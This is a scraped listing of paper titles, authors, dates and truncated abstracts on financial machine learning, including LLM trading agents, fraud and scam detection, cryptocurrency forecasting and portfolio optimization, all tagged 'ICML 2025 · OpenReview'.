  - *Fei Xiong, Xiang Zhang, Aosong Feng et al.*
  - **ICML 2025** · OpenReview · `2025-09-08`
  - Recent advances in Large Language Models (LLMs) have shown remarkable capabilities in financial reasoning and market understanding. Multi-agent LLM frameworks such as TradingAgent and FINMEM augment these models to long-horizon investment tasks by leveraging fundamental and senti…

- **[Spatio-Temporal Directed Graph Learning for Account Takeover Fraud Detection](https://openreview.net/forum?id=Yx89Ibpym7)**
  - *Mohsen Nayebi Kerdabadi, William A. Byron, xin sun et al.*
  - **ICML 2025** · OpenReview · `2025-09-07`
  - Account Takeover (ATO) fraud poses a significant challenge in consumer banking, requiring high recall under strict latency while minimizing friction for legitimate users. Production systems typically rely on tabular gradient-boosted decision trees (e.g., XGBoost) that score sessi…

- **[Generation-Time vs. Post-hoc Citation: A Holistic Evaluation of LLM Attribution](https://openreview.net/forum?id=iQyfHmqRJR)**
  - *Yash Saxena, Raviteja Bommireddy, Ankur Padia et al.*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - Trustworthy Large Language Models (LLMs) must cite human-verifiable sources in high-stakes domains such as healthcare, law, academia, and finance, where even small errors can have severe consequences. Practitioners and researchers face a choice: let models generate citations duri…

- **[A Protocol-Driven Platform for Agent-Agnostic Evaluation of LLM Agents](https://openreview.net/forum?id=G9YKfCddN3)**
  - *Cong Minh Tran, Issam Falih, Hatim CHAHDI et al.*
  - **ICML 2025** · OpenReview · `2025-09-05`
  - The fast growth of LLM-based agents has outpaced efforts to build solid evaluation standards, causing mismatched formats and idiosyncratic reporting that often makes fair comparisons challenging. To tackle this, we created a platform around a protocol-based setup that keeps evalu…

- **[Who Routes the Router: Rethinking the Evaluation of LLM Routing Systems](https://openreview.net/forum?id=EEPostHMtF)**
  - *Jiayi Yuan, Yifan Lu, Rixin Liu et al.*
  - **ICML 2025** · OpenReview · `2025-09-03`
  - The growing ecosystem of Large Language Models (LLMs) with diverse capabilities and costs has motivated the need for LLM routing systems that dynamically select the most appropriate model for each query.
Evaluating these routing systems is important yet inherently challenging due…

- **[Healthcare Insurance Fraud Detection via Continual Fiedler Vector Graph Model](https://openreview.net/forum?id=ZWDvIKMkMG)**
  - *Yehan Zhang, Huaidong Zhang, Xuandi Luo et al.*
  - **ICML 2025** · OpenReview · `2025-09-02`
  - Healthcare insurance fraud detection presents unique machine learning challenges: labeled data are scarce due to delayed verification processes, and fraudulent behaviors evolve rapidly, often manifesting in complex, graph-structured interactions. Existing methods struggle in such…

- **[The Automated but Risky Game: Modeling Agent-to-Agent Negotiations and Transactions in Consumer Markets](https://openreview.net/forum?id=XZpIu68yW6)**
  - *Shenzhe Zhu, Jiao Sun, Yi Nian et al.*
  - **ICML 2025** · OpenReview · `2025-09-01`
  - AI agents are increasingly used in consumer-facing applications to assist with tasks such as product search, negotiation, and transaction execution. In this paper, we investigate a future setting where both consumers and merchants authorize AI agents to automate the negotiations…

- **[From Many Voices to One: Statistically Principled Aggregation of LLM Judges](https://openreview.net/forum?id=XdcofpTCyq)**
  - *Jitian Zhao, Changho Shin, Tzu-Heng Huang et al.*
  - **ICML 2025** · OpenReview · `2025-08-29`
  - LLM-as-a-judge---often with multiple judges---is now the standard for scalable model evaluation, yet judge biases and correlations can amplify errors. We cast aggregation as inference in a latent-factor Markov random field that jointly models a latent true-quality variable, inter…

- **[TradingGroup: A Multi-Agent Trading System with Self-Reflection and Data-Synthesis](https://arxiv.org/abs/2508.17565)**
  - *Feng Tian, Flora D. Salim, Hao Xue*
  - **ICML 2025** · OpenReview · `2025-08-01`
  - Recent advancements in large language models (LLMs) have enabled powerful agent-based applications in finance, particularly for sentiment analysis, financial report comprehension, and stock forecasting. However, existing systems often lack inter-agent coordination, structured sel…

- **[Financial Fraud Detection with Entropy Computing](https://openreview.net/forum?id=gRnaP5Mw4k)**
  - *Babak Emami, Wesley Dyk, David Haycraft et al.*
  - **ICML 2025** · OpenReview · `2025-07-16`
  - We introduce CVQBoost, a novel classification algorithm
that leverages early hardware implementing Quantum Computing Inc’s
Entropy Quantum Computing (EQC) paradigm, Dirac-3. We apply CVQ-
Boost to a fraud detection test case and benchmark its performance
against XGBoost, a widely…

- **[Search Algorithm Portfolios with Multithreaded Components](https://openreview.net/forum?id=VSMc1rHKLk)**
  - *Takumi Shimoda, Alex S. Fukunaga*
  - **ICML 2025** · OpenReview · `2025-07-12`
  - One successful approach to parallel satisficing search is a search algorithm portfolio, where each processor executes an independent search process. Portfolios are competitive with parallel search algorithms where threads use shared Open/Closed lists. We investigate the scalabili…

- **[Knowledge-Grounded Detection of Cryptocurrency Scams with Retrieval-Augmented LMs](https://openreview.net/forum?id=qDDuQGypqM)**
  - *Zichao Li*
  - **ICML 2025** · OpenReview · `2025-06-06`
  - This paper presents a knowledge-grounded framework for cryptocurrency scam detection using retrieval-augmented language models. We address three key limitations of existing approaches: static knowledge bases, unreliable LM outputs, and fixed classification thresholds. Our method…

- **[Trading-off Reward Maximization and Stability in Sequential Decision Making](https://openreview.net/forum?id=5FSTwSgQQz)**
  - *Federico Corso, Marco Mussi, Alberto Maria Metelli*
  - **ICML 2025** · OpenReview · `2025-06-04`
  - Reinforcement Learning (RL) focuses on learning policies that maximize the expected reward. This simple objective has enabled the success of RL in a wide range of scenarios. However, as emphasized by control-theoretic methods, stability is also a desired property when dealing wit…

- **[Multilingual Financial Word Embeddings for Arabic, English and French](https://openreview.net/forum?id=s3BXlQQ2IK)**
  - *{'fullname': 'Nadhem Zmandar', 'username': 'https://orcid.org/orcid-search/search?searchQuery=Nadhem%20Zmandar'}, {'fullname': 'Mahmoud El-Haj', 'username': '~Mo_El-Haj1'}, {'fullname': 'Paul Rayson', 'username': 'https://orcid.org/0000-0002-1257-2191'}*
  - **ICML 2025** · OpenReview · `2025-05-09`
  - Natural Language Processing is increasingly being applied to analyse the text of many different types of financial documents. For many tasks, it has been shown that standard language models and tools need to be adapted to the financial domain in order to properly represent domain…

- **[Risk and return prediction for pricing portfolios of non-performing consumer credit](https://openreview.net/forum?id=nrKd35xs6S)**
  - *WANG Siyi, Xing YAN, Bangqi Zheng et al.*
  - **ICML 2025** · OpenReview · `2025-02-26`
  - We design a system for risk-analyzing and pricing portfolios of non-performing consumer credit loans. The rapid development of credit lending business for consumers heightens the need for trading portfolios formed by overdue loans as a manner of risk transferring. However, the pr…

- **[agenticMSA: Agentic Multimodal Sentiment Analysis with Task-Specific and Large Language Model Collaboration](https://openreview.net/forum?id=ATwJ8MWnth)**
  - **ICML 2025** · OpenReview · `2025-02-10`
  - Multimodal Sentiment Analysis (MSA) faces challenges due to inconsistencies between modalities, such as conflicting sentiment cues from visual, audio, and text data. These modality conflicts make it difficult for previous task-specific samll-scale models to accurately predict sen…

- **[Financial Fraud Detection using Jump-Attentive Graph Neural Networks](https://openreview.net/forum?id=9w3R5lfhZB)**
  - *Prashank Kadam*
  - **ICML 2025** · OpenReview · `2025-02-07`
  - As the availability of financial services online continues to grow, the incidence of fraud has surged correspondingly. Fraudsters continually seek new and innovative ways
to circumvent the detection algorithms in place. Traditionally,
fraud detection relied on rule-based methods,…

- **[Performant LLM Agentic Framework for Conversational AI](https://openreview.net/forum?id=JDXB6nvH9x)**
  - *Alex Casella, Wayne Wang*
  - **ICML 2025** · OpenReview · `2025-01-22`
  - The rise of Agentic applications and automation in the Voice AI industry has led to an increased reliance on Large Language Models (LLMs) to navigate graph-based logic workflows composed of nodes and edges. However, existing methods face challenges such as alignment errors in com…

- **[Trading Confidence: Comprehensive Uncertainty Estimation in Algorithmic Trading](https://openreview.net/forum?id=IWDsycHMSP)**
  - *Lin Li, Li Rong Wang, Hsuan Fu et al.*
  - **ICML 2025** · OpenReview · `2025-01-01`
  - Description Reinforcement Learning (RL) has emerged as a powerful approach in financial trading, enabling agents to learn optimal strategies through direct market interaction. However, financial markets are highly uncertain, with price fluctuations driven by stochastic volatility…

- **[TradingAgents: Multi-Agents LLM Financial Trading Framework](https://openreview.net/forum?id=4QPrXwMQt1)**
  - *Yijia Xiao, Edward Sun, Di Luo et al.*
  - **ICML 2025** · OpenReview · `2024-12-02`
  - Significant progress has been made in automated problem-solving using societies of agents powered by large language models (LLMs). In finance, efforts have largely focused on single-agent systems handling specific tasks or multi-agent frameworks independently gathering data. Howe…

- **[The Poorest Man in Babylon: A Longitudinal Study of Cryptocurrency Investment Scams](https://openreview.net/forum?id=P0x8J5gCPP)**
  - *Muhammad Muzammil, Abisheka Pitumpe, Xigao Li et al.*
  - **ICML 2025** · OpenReview · `2024-10-06`
  - Governments and regulatory bodies have recognized investment scams as the most prevalent forms of cryptocurrency fraud. These scams typically use professional-looking websites to lure unsuspecting victims with promises of unrealistically high returns. In this paper, we introduce…

- **[DiT-LSTM-SVAR Model For Portfolios](https://openreview.net/forum?id=MeOi6u9E23)**
  - *Yuxing Yuan, Ziwei Wang, Zhenyuan Huang et al.*
  - **ICML 2025** · OpenReview · `2024-09-26`
  - This paper proposes a novel combined model named DiT-LSTM-SVAR, which successfully integrates time series and the Efficient Markets Hypothesis. This is the first to combine the microstructure of financial markets with deep learning networks to improve the performance of portfolio…

- **[A Fully Analog Pipeline for Portfolio Optimization](https://openreview.net/forum?id=mtkbTUVaV1)**
  - *James S. Cummins, Natalia Berloff*
  - **ICML 2025** · OpenReview · `2024-09-11`
  - Portfolio optimization is a ubiquitous problem in financial mathematics that relies on accurate estimates of covariance matrices for asset returns. However, estimates of pairwise covariance are notoriously poor and calculating time-sensitive optimal portfolios is energy-intensive…

- **[Financial Sentiment Analysis: Techniques and Applications](https://openreview.net/forum?id=CFNmRsC7hs)**
  - *Kelvin Du, Frank Xing, Rui Mao et al.*
  - **ICML 2025** · OpenReview · `2024-09-01`
  - Financial Sentiment Analysis (FSA) is an important domain application of sentiment analysis that has gained increasing attention in the past decade. FSA research falls into two main streams. The first stream focuses on defining tasks and developing techniques for FSA, and its mai…

- **[A Portfolio’s Common Causal Conditional Risk-Neutral PDE](https://openreview.net/forum?id=oHgvpDTOve)**
  - *{'fullname': 'Alejandro Rodriguez Dominguez', 'username': '~Alejandro_Rodriguez_Dominguez1'}*
  - **ICML 2025** · OpenReview · `2024-08-01`
  - Portfolio’s optimal drivers for diversification are common causes of the constituents’ correlations. A closed-form formula for the conditional probability of the portfolio given its optimal common drivers is presented, with each pair constituent-common driver joint distribution m…

- **[Clustering-Augmented Fraud Detection on Graphs Using Label-Aware Feature Aggregation](https://openreview.net/forum?id=sosXTwotGd)**
  - *Shixiong Jing, Lingwei Chen, Dinghao Wu*
  - **ICML 2025** · OpenReview · `2024-07-04`
  - Fraud detection has emerged as a pivotal process in different fields (e.g., e-commerce, social networks). Since interactions among entities provide valuable insights into fraudulent activities, such behaviors can be naturally represented as graphs, where graph neural networks (GN…

- **[Cryptocurrency Prices Forecast Using GNNs](https://openreview.net/forum?id=vbdU3t6Nkp)**
  - *Ly Hai Nguyen, Edwin Onyango, Chahak Goyal et al.*
  - **ICML 2025** · OpenReview · `2024-03-31`
  - Cryptocurrencies have become an extremely popular and volatile market, delivering massive returns (as well as losses) to investors. Cryptocurrency returns prediction remains an open and extremely challenging forecasting task. Using the time series of historical prices as training…

- **[FinMem: A Performance-Enhanced LLM Trading Agent with Layered Memory and Character Design](https://openreview.net/forum?id=sstfVOwbiG)**
  - *Haohang Li, Yangyang Yu, Zhi Chen et al.*
  - **ICML 2025** · OpenReview · `2024-02-03`
  - Recent advancements in Large Language Models (LLMs) have exhibited notable efficacy in natural language processing (NLP) tasks across diverse domains. Their prowess in integrating extensive knowledge has fueled interest in developing LLM-based autonomous agents. Furthermore, in t…

- **[Financial Networks and Other Adventures in Graph Learning](https://openreview.net/forum?id=DCOnX2Zv6i)**
  - *Béni Egressy*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - This thesis investigates graph problems from both a machine learning and a theoretical perspective. In particular, it explores financial applications, focusing on fraud detection, central bank bailouts, and lending. The thesis is split into two main parts, broadly corresponding t…

- **[Financial Risk Assessment via Long-term Payment Behavior Sequence Folding](https://arxiv.org/abs/2411.15056)**
  - *Yiran Qiao, Yateng Tang, Xiang Ao et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Online inclusive financial services encounter significant financial risks due to their expansive user base and low default costs. By real-world practice, we reveal that utilizing longer-term user payment behaviors can enhance models' ability to forecast financial risks. However,…

- **[Financial Risk Assessment via Long-term Payment Behavior Sequence Folding](https://openreview.net/forum?id=unqcVrSezM)**
  - *Yiran Qiao, Yateng Tang, Xiang Ao et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Online inclusive financial services encounter significant financial risks due to their expansive user base and low default costs. By real-world practice, we reveal that utilizing longer-term user payment behaviors can enhance models' ability to forecast financial risks. However,…

- **[TradingAgents: Multi-Agents LLM Financial Trading Framework](https://arxiv.org/abs/2412.20138)**
  - *Yijia Xiao, Edward Sun, Di Luo et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Significant progress has been made in automated problem-solving using societies of agents powered by large language models (LLMs). In finance, efforts have largely focused on single-agent systems handling specific tasks or multi-agent frameworks independently gathering data. Howe…

- **[Trading Volume Maximization with Online Learning](https://arxiv.org/abs/2405.13102)**
  - *Tommaso Cesari, Roberto Colomboni*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - We explore brokerage between traders in an online learning framework. At any round $t$, two traders meet to exchange an asset, provided the exchange is mutually beneficial. The broker proposes a trading price, and each trader tries to sell their asset or buy the asset from the ot…

- **[Collateral Portfolio Optimization in Crypto-Backed Stablecoins](https://arxiv.org/abs/2405.08305)**
  - *Bretislav Hajek, Daniël Reijsbergen, Anwitaman Datta et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Stablecoins - crypto tokens whose value is pegged to a real-world asset such as the US Dollar - are an important component of the DeFi ecosystem as they mitigate the impact of token price volatility. In crypto-backed stablecoins, the peg is founded on the guarantee that in case o…

- **[Cryptocurrency Analysis: Price Prediction of Cryptocurrency Using User Sentiments and Quantitative Data](https://openreview.net/forum?id=Iy7tsxFdSt)**
  - *Dayan Perera, Jessica Lim, Shuta Gunraku et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - This research introduces an innovative approach to forecasting cryptocurrency prices by combining user-generated content (UGC) and sentiment analysis with quantitative data. The primary goal is to overcome limitations in existing methods for market forecasting, where accurate for…

- **[Cryptocurrency Topic Burst Prediction via Hybrid Twin-structured Multi-modal Learning](https://openreview.net/forum?id=h5r1B6G0dc)**
  - *Keting Yin, Xiaen Sun, Tian Feng*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Social media users actively engage in discussions concerning news and events within the dynamic cryptocurrency market, resulting in the widespread dissemination of cryptocurrency-related topics across various platforms. The ongoing monitoring of these topics is crucial to informe…

- **[Cryptocurrency Price Forecasting Using XGBoost Regressor and Technical Indicators](https://arxiv.org/abs/2407.11786)**
  - *{'fullname': 'Abdelatif Hafid', 'username': ''}, {'fullname': 'Maad Ebrahim', 'username': ''}, {'fullname': 'Ali Alfatemi', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - The rapid growth of the stock market has attracted many investors due to its potential for significant profits. However, predicting stock prices accurately is difficult because financial markets are complex and constantly changing. This is especially true for the cryptocurrency m…

- **[Cryptocurrency Price Forecasting using Variational Autoencoder with Versatile Quantile Modeling](https://openreview.net/forum?id=VtVNMYPGRp)**
  - *Sungchul Hong, SeungHwan An, Jong-June Jeon*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - In recent years, there has been a growing interest in probabilistic forecasting methods that offer more comprehensive insights by considering prediction uncertainties rather than point estimates. This paper introduces a novel variational autoencoder learning framework for multiva…

- **[Identifying Risky Vendors in Cryptocurrency P2P Marketplaces](https://openreview.net/forum?id=rvSv8Df4AB)**
  - *Taro Tsuchiya, Alejandro Cuevas, Nicolas Christin*
  - **ICML 2025** · OpenReview · `2023-10-04`
  - Peer-to-Peer (P2P) cryptocurrency exchanges are two-sided marketplaces, similar to eBay/Craigslist, where individuals can offer to sell cryptocurrency assets in exchange for payment.
Due to disintermediation, these marketplaces trade off increased privacy for higher risk (e.g., s…

- **[Interface Illusions: Uncovering the Rise of Visual Scams in Cryptocurrency Wallets](https://openreview.net/forum?id=39AIGw9x8m)**
  - *Guoyi Ye, Geng Hong, Yuan Zhang et al.*
  - **ICML 2025** · OpenReview · `2023-09-27`
  - Cryptocurrencies, while revolutionary, have become a magnet for malicious actors. With numerous reports underscoring cyberattacks and scams in this domain, our paper takes the lead in characterizing visual scams associated with cryptocurrency wallets—a fundamental component of We…

- **[Exploring Modern Evolution Strategies in Portfolio Optimization](https://openreview.net/forum?id=KiQ8PhDzIU)**
  - *Ramin Hasani, Etan A Ehsanfar, Greg A Banis et al.*
  - **ICML 2025** · OpenReview · `2023-09-26`
  - Black-box optimization (BBO) techniques are often the core engine used in combinatorial optimization problems which include multi-asset class portfolio construction. The computational complexity of such evolutionary algorithms, however, is excessively high to the point that findi…

- **[Partitioning Message Passing for Graph Fraud Detection](https://openreview.net/forum?id=tEgrUrUuwA)**
  - *Wei Zhuo, Zemin Liu, Bryan Hooi et al.*
  - **ICML 2025** · OpenReview · `2023-09-24`
  - Label imbalance and homophily-heterophily mixture are the fundamental problems encountered when applying Graph Neural Networks (GNNs) to Graph Fraud Detection (GFD) tasks. Existing GNN-based GFD models are designed to augment graph structure to accommodate the inductive bias of G…

- **[Financial Time Series Data Prediction by Combination Model Adaboost-KNN-LSTM](https://openreview.net/forum?id=JRZ1CG0S6n)**
  - *Heng Zhao, Xinran Li, Jiakai Xu et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Financial time series is the main research direction of financial researchers due to its important economic value. However, owing to stochastic nature of financial markets, the data used by financial time series models need to have a series of features. This limits the use of fin…

- **[Unsupervised Financial Fraud Detection Using Low-rank Recovery](https://openreview.net/forum?id=zFcQ9cez3h)**
  - *Jingjing Zheng, John Hawkin, Charles Robertson et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Many outlier detection methods have been studied and applied to financial fraud detection problems in recent years. These traditional financial fraud detection problems (such as classification-based methods) often suffer performance degradation caused by imbalanced data. Even wor…

- **[Spotlight News Driven Quantitative Trading Based on Trajectory Optimization](https://openreview.net/forum?id=jLIv3t9fuR)**
  - *Mengyuan Yang, Mengying Zhu, Qianqiao Liang et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - News-driven quantitative trading (NQT) has been popularly studied in recent years. Most existing NQT methods are performed in a two-step paradigm, i.e., first analyzing markets by a financial prediction task and then making trading decisions, which is doomed to failure due to the…

- **[Portfolio Optimization using Predictive Auxiliary Classifier Generative Adversarial Networks with Measuring Uncertainty](https://arxiv.org/abs/2304.11856)**
  - *Jiwook Kim, Minhyeok Lee*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - In financial engineering, portfolio optimization has been of consistent interest. Portfolio optimization is a process of modulating asset distributions to maximize expected returns and minimize risks. To obtain the expected returns, deep learning models have been explored in rece…

- **[Collaborative Fraud Detection: How Collaboration Impacts Fraud Detection](https://openreview.net/forum?id=doxofj6iUW)**
  - *Jinzhang Hu, Ruimin Hu, Zheng Wang et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Collaborative fraud has become increasingly serious in telecom and social networks, but is hard to detect by traditional fraud detection methods. In this paper, we find a significant positive correlation between the increase of collaborative fraud and the degraded detection perfo…

- **[Cryptocurrency Portfolio Optimization by Neural Networks](https://arxiv.org/abs/2310.01148)**
  - *Quoc Minh Nguyen, Dat Thanh Tran, Juho Kanniainen et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Many cryptocurrency brokers nowadays offer a variety of derivative assets that allow traders to perform hedging or speculation. This paper proposes an effective algorithm based on neural networks to take advantage of these investment products. The proposed algorithm constructs a…

- **[Cryptocurrency Portfolio Optimization by Neural Networks](https://openreview.net/forum?id=8alfjwG7lf)**
  - *Quoc Minh Nguyen, Dat Thanh Tran, Juho Kanniainen et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Many cryptocurrency brokers nowadays offer a va-riety of derivative assets that allow traders to perform hedging or speculation. This paper proposes an effective algorithm based on neural networks to take advantage of these investment products. The proposed algorithm constructs a…

- **[Examining Liquidity of Exchanges and Assets and the Impact of External Events in Centralized Crypto Markets: A 2022 Study](https://openreview.net/forum?id=tpk47MymYw)**
  - *Adrian Jobst, Daniel Atzberger, Robert Henker et al.*
  - **ICML 2025** · OpenReview · `2023-01-01`
  - Most cryptocurrencies are bought and sold on centralized exchanges that manage supply and demand via an order book. Besides trading fees, the high liquidity of a market is the most relevant reason for choosing one exchange over the other. However, as the different liquidity measu…

- **[Financial data analysis application via multi-strategy text processing](https://arxiv.org/abs/2204.11394)**
  - *Hongyin Zhu*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Maintaining financial system stability is critical to economic development, and early identification of risks and opportunities is essential. The financial industry contains a wide variety of data, such as financial statements, customer information, stock trading data, news, etc.…

- **[Cryptographic and Financial Fairness](https://openreview.net/forum?id=B56IlH5g8N)**
  - *Daniele Friolo, Fabio Massacci, Chan Nam Ngo et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - A recent trend in multi-party computation is to achieve cryptographic fairness via monetary penalties, i.e. each honest player either obtains the output or receives a compensation in the form of a cryptocurrency. We pioneer another type of fairness, financial fairness, that is cl…

- **[Cryptographic and Financial Fairness](https://arxiv.org/abs/2207.10780)**
  - *Daniele Friolo, Fabio Massacci, Chan Nam Ngo et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - A recent trend in multi-party computation is to achieve cryptographic fairness via monetary penalties, i.e. each honest player either obtains the output or receives a compensation in the form of a cryptocurrency. We pioneer another type of fairness, financial fairness, that is cl…

- **[Trading Positional Complexity vs Deepness in Coordinate Networks](https://openreview.net/forum?id=0qVaMVKCNi)**
  - *Jianqiao Zheng, Sameera Ramasinghe, Xueqian Li et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - It is well noted that coordinate-based MLPs benefit—in terms of preserving high-frequency information—through the encoding of coordinate positions as an array of Fourier features. Hitherto, the rationale for the effectiveness of these positional encodings has been mainly studied…

- **[Trading off Utility, Informativeness, and Complexity in Emergent Communication](https://openreview.net/forum?id=pcuDXVFRbw)**
  - *Mycal Tucker, Roger Levy, Julie A. Shah et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Emergent communication (EC) research often focuses on optimizing task-specific utility as a driver for communication. However, there is increasing evidence that human languages are shaped by task-general communicative constraints and evolve under pressure to optimize the Informat…

- **[A Selective Portfolio Management Algorithm with Off-Policy Reinforcement Learning Using Dirichlet Distribution](https://openreview.net/forum?id=JVZvp4YhI4)**
  - *Hyunjun Yang, Hyeonjun Park, Kyungjae Lee*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Existing methods in portfolio management deterministically produce an optimal portfolio. However, according to modern portfolio theory, there exists a trade-off between a portfolio’s expected returns and risks. Therefore, the optimal portfolio does not exist definitively, but sev…

- **[Cryptocurrency Trading Agent Using Deep Reinforcement Learning](https://openreview.net/forum?id=XW3tnMhPFu)**
  - *Uwais Suliman, Terence L. van Zyl, Andrew Paskaramoorthy*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Cryptocurrencies are peer-to-peer digital assets monitored and organised by a blockchain network. Price prediction has been a significant focus point with various machine learning algorithms, especially concerning cryptocurrency. This work addresses the challenge faced by traders…

- **[Cryptocurrency Price Prediction with Convolutional Neural Network and Stacked Gated Recurrent Unit](https://openreview.net/forum?id=98spjLJzqq)**
  - *Chuen Yik Kang, Chin-Poo Lee, Kian-Ming Lim*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Virtual currencies have been declared as one of the financial assets that are widely recognized as exchange currencies. The cryptocurrency trades caught the attention of investors as cryptocurrencies can be considered as highly profitable investments. To optimize the profit of th…

- **[A Deep Learning-Based Cryptocurrency Price Prediction Model That Uses On-Chain Data](https://openreview.net/forum?id=6XBg6f3kBb)**
  - *Gyeongho Kim, Dong-Hyun Shin, Jaegyeong Choi et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Cryptocurrency has recently attracted substantial interest from investors due to its underlying philosophy of decentralization and transparency. Considering cryptocurrency’s volatility and unique characteristics, accurate price prediction is essential for developing successful in…

- **[Cryptocurrency Price Prediction With Multi-task Multi-step Sequence-to-Sequence Modeling](https://openreview.net/forum?id=x5ZNDu77kF)**
  - *Jesper T. Kristensen, Juan P. Madrigal-Cianci, Giorgos Felekis et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - In the scientific and commercial worlds, predicting cryptocurrency prices over time has gotten a lot of interest. Most related studies use variations of Recurrent Neural Networks to forecast the next value of a single coin due to the temporal nature of the challenge. As a result,…

- **[Financial fraud risk analysis based on audit information knowledge graph](https://openreview.net/forum?id=85kQohPZew)**
  - *Huidong Wu, Yanpeng Chang, Jianping Li et al.*
  - **ICML 2025** · OpenReview · `2021-01-01`
  - The frequent occurrence of financial fraud caused by listed companies has seriously hindered the healthy development of the capital market. Existing studies usually analyze financial fraud through the effectiveness of audit opinion or the correlation between auditor change rate a…

- **[Financial fraud detection using the related-party transaction knowledge graph](https://openreview.net/forum?id=Ib8D0OFUDt)**
  - *Xuting Mao, Hao Sun, Xiaoqian Zhu et al.*
  - **ICML 2025** · OpenReview · `2021-01-01`
  - Financial fraud detection has gained constant attention from researchers, practitioners, and regulators. Because of its concealment and ease of manipulation, related-party transactions (RPTs) among firms have become a usual way to implement financial fraud. However, the tradition…

- **[Trading strategy of structured mutual fund based on deep learning network](https://openreview.net/forum?id=oh1ymyx23K)**
  - *Jiao Chen, Changqing Luo, Lurun Pan et al.*
  - **ICML 2025** · OpenReview · `2021-01-01`
  - Highlights•Deep learning network is constructed for trading strategy of structured fund.•Deep learning network is useful for modeling structured fund’s trading strategy.•Considering trading behavior and share numbers can improve model performance.•Transfer learning can stabilize…

- **[Trading off data resource availability and privacy preservation in multi-layer network transaction](https://openreview.net/forum?id=FsX7y5IZl3)**
  - *Yun Hu, Chunguo Li, Aiqun Hu et al.*
  - **ICML 2025** · OpenReview · `2021-01-01`
  - The big data market solves the problem of the effective utilization of data through treating data as the circulating commodity in the market. The existing body of research on the big data market suggests that either improving the availability of published data or protecting sensi…

- **[Trading with the Momentum Transformer: An Intelligent and Interpretable Architecture](https://arxiv.org/abs/2112.08534)**
  - *Kieran Wood, Sven Giegerich, Stephen J. Roberts et al.*
  - **ICML 2025** · OpenReview · `2021-01-01`
  - We introduce the Momentum Transformer, an attention-based deep-learning architecture, which outperforms benchmark time-series momentum and mean-reversion trading strategies. Unlike state-of-the-art Long Short-Term Memory (LSTM) architectures, which are sequential in nature and ta…

- **[Cryptocurrency Usage Impact on Perceived Benefits and Users’ Behaviour](https://openreview.net/forum?id=iOEHErWiXz)**
  - *{'fullname': 'Omar Alqaryouti'}, {'fullname': 'Nur Siyam'}, {'fullname': 'Zainab Alkashri'} et al.*
  - **ICML 2025** · OpenReview · `2020-04-17`
  - This paper aims to analyse the impact of Cryptocurrency usage on users’ perceived benefits and behaviour. The Technology Acceptance Model has been used as foundation for this research. In this study, three main factors were examined, namely perceived ease of use, perceived benefi…

- **[Users’ Knowledge and Motivation on Using Cryptocurrency](https://openreview.net/forum?id=k7lgOyf7XP)**
  - *{'fullname': 'Omar Alqaryouti'}, {'fullname': 'Nur Siyam'}, {'fullname': 'Zainab Alkashri'} et al.*
  - **ICML 2025** · OpenReview · `2020-04-17`
  - Cryptocurrency is a decentralized digital currency stored in an online form that does not fall under governments and banks control. This study aimed at understanding users’ knowledge and their motivation on using cryptocurrency through structured interviews. Data was gathered thr…

- **[Financial news recommendation based on graph embeddings](https://openreview.net/forum?id=zzffQUnh7x)**
  - *Jiangtao Ren, Jiawei Long, Zhikang Xu*
  - **ICML 2025** · OpenReview · `2019-01-01`
  - Highlights•We introduce NNR, a graph-based method for financial news recommendation that outperforms the commonly used baselines.•We develop INNR, an incremental approach that makes the recommendation process more efficient.•We combine NNR and INNR to create a graph embeddings-ba…

- **[Towards Decentralized Equilibrium Asset Trading Based on Blockchain](https://openreview.net/forum?id=WtEKcbKlao)**
  - *Kai Lei, Maoyu Du, Liwei Yang et al.*
  - **ICML 2025** · OpenReview · `2019-01-01`
  - The last decade has witnessed the explosive growth of digital tokens and cryptocurrencies including Bitcoin, reward programs and various tokens on Ethereum. However, trading these heterogeneous and non-financial digital assets often encounters substantial liquidity barriers due t…

- **[Cryptocurrency Usage Impact on Perceived Benefits and Users' Behaviour](https://openreview.net/forum?id=XfaL2qmyIE)**
  - *Omar Alqaryouti, Nur Siyam, Zainab Alkashri et al.*
  - **ICML 2025** · OpenReview · `2019-01-01`
  - This paper aims to analyse the impact of Cryptocurrency usage on users’ perceived benefits and behaviour. The Technology Acceptance Model has been used as foundation for this research. In this study, three main factors were examined, namely perceived ease of use, perceived benefi…

- **[Users' Knowledge and Motivation on Using Cryptocurrency](https://openreview.net/forum?id=nukYddD2kK)**
  - *Omar Alqaryouti, Nur Siyam, Zainab Alkashri et al.*
  - **ICML 2025** · OpenReview · `2019-01-01`
  - Cryptocurrency is a decentralized digital currency stored in an online form that does not fall under governments and banks control. This study aimed at understanding users’ knowledge and their motivation on using cryptocurrency through structured interviews. Data was gathered thr…

- **[Computation of Loss Distribution Based on the Structural Model for Credit Portfolios](https://openreview.net/forum?id=H9YyL2epYt)**
  - *Meng Han*
  - **ICML 2025** · OpenReview · `2018-01-01`
  - Credit risk analysis and management at the portfolio level is a challenging issue for financial institutions due to their portfolios’ large size, heterogeneity and complex correlation structure. In this thesis, we propose several new asymptotic methods and exact methods to comput…

- **[Financial Fraud Detection: a New Ensemble Learning Approach for Imbalanced Data](https://openreview.net/forum?id=wlgQTGscdX)**
